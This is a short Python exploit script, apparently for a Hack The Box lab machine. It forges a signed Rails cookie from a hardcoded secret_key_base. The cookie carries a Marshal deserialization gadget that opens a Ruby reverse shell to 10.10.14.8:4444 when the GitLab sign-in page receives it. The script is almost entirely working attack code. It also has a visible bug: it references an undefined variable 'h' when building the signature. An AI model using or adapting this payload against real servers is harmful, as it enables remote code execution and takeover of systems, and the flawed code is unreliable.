from hashlib import pbkdf2_hmac,sha1
import base64
import hmac
import requests
import urllib3
urllib3.disable_warnings()
key = pbkdf2_hmac(
    hash_name = 'sha1', 
    password = b"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", #secret_key_base
    salt = b"signed cookie", 
    iterations = 1000, 
    dklen = 64
)
ip = '10.10.14.8'
port = '4444'
code='\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\b:\t@srcI\"\x01\x80`ruby -rsocket -e \'exit if fork;c=TCPSocket.new(\"'+ip+'\",'+port+');while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\'`\x06:\x06ET:\x0E@filenameI\"\x061\x06;\tT:\f@linenoi\x06:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT'

cookie_signature = hmac.new(key, base64.b64encode(code), sha1)
payload =base64.b64encode(code)+'--'+h.hexdigest()
cookies = {'experimentation_subject_id':payload}
res = requests.get("https://git.laboratory.htb/users/sign_in",cookies=cookies,verify=False)
print payload
